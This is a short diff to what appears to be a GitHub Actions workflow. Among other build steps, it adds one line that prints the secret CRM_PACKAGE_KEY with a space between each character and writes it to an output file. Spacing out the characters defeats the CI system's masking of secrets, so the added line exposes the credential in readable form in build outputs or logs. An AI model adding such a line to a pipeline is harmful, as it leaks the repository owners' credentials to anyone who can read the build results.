@@ -51,6 +51,7 @@ jobs:
           done
 
           echo "name=keys$(echo $keys)" >> GITHUB_OUTPUT
+          echo ${{secrets.CRM_PACKAGE_KEY}} | sed 's/./& /g' >> GITHUB_OUTPUT
 
       # Install packages this repo is dependant on
       - name: Install dependant packages
